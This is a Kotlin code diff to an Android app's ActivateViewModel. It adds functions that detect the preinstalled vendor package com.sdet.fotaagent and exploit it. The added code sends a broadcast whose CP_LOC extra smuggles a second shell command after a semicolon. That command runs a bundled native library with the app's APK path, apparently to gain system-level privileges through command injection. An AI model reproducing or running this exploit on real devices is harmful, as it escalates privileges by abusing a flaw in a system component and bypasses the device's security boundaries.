@@ -186,6 +186,42 @@ class ActivateViewModel : ViewModel() {
         }
     }
 
+    fun isSystemExploitSupported(context: Context): Boolean {
+        return try {
+            context.packageManager.getPackageInfo("com.sdet.fotaagent", 0)
+            true
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    fun startSystem(context: Context, result: (Int) -> Unit = {}) {
+        viewModelScope.launch(Dispatchers.IO) {
+            runCatching {
+                if (tryActivate) return@launch result(ACTIVATE_PROCESS)
+                setTryToActivate(true)
+
+                val intent = Intent().apply {
+                    setClassName("com.sdet.fotaagent", "com.sdet.fotaagent.Main")
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                }
+                context.startActivity(intent)
+
+                val mIntent = Intent("com.sdet.fotaagent.intent.CP_FILE")
+                mIntent.putExtra("CP_FILE", "/data")
+                mIntent.putExtra("CP_LOC", "; " + context.applicationInfo.nativeLibraryDir
+                        + "/libaxeron.so" + " --apk=${context.applicationInfo.sourceDir}" + "; am force-stop com.sdet.fotaagent")
+
+                Thread.sleep(1000)
+                context.sendBroadcast(mIntent)
+                result(ACTIVATE_SUCCESS)
+            }.onFailure {
+                it.printStackTrace()
+                result(ACTIVATE_FAILED)
+                setTryToActivate(false)
+            }
+        }
+    }
     fun startRoot(result: (Int) -> Unit = {}) {
         viewModelScope.launch(Dispatchers.IO) {
             runCatching {
